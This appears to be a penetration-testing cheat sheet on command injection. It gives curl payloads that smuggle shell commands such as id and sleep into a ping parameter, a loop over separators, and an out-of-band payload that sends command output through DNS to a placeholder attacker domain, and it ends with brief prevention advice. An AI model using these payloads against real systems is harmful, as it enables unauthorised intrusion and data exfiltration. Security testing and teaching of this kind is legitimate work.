# Command Injection — Full

**Signs**
- Parameters hit shell commands (ping, tar, curl, convert, nslookup).
- Time‑based differences (sleep), error leakage, or output injection.

## 1) Quick Checks
```bash
curl -ks "$target/ping?host=127.0.0.1;id"
curl -ks "$target/ping?host=127.0.0.1&&id"
curl -ks "$target/ping?host=127.0.0.1%0aid"
curl -ks "$target/ping?host=$(id)"
curl -ks "$target/ping?host=`id`"
```

## 2) Timing (Blind)
```bash
# Expect ~3s if injectable
curl -sk "$target/ping?host=127.0.0.1;sleep 3" -o /dev/null -w 'time_total=%{time_total}\n'
```

## 3) Payload Shapes
See [`payloads.md`](payloads.md) for Linux/Windows variants, separators, and encodings.

## 4) Automation (small demo)
```bash
for sep in ';' '&&' '|' '%0a' '`' '$(id)'; do
  curl -ks "$target/ping?host=127.0.0.1${sep}id" | head -n 3
done
```

## 5) Out‑of‑Band (Blind)
```bash
# with interactsh or similar
curl -ks "$target/ping?host=$(id|base64).your.oob.domain"
```

## 6) Prevention (Dev)
- No shell concatenation; use exec APIs with **array args** (no shell=True).
- Strict allow‑lists for inputs; validate/normalize; drop privs; chroot/sandbox.
- Disable risky binaries; apply AppArmor/SELinux profiles; log and alert.

See [`prevention.md`](prevention.md) for code examples (Python, Node, PHP, Bash).
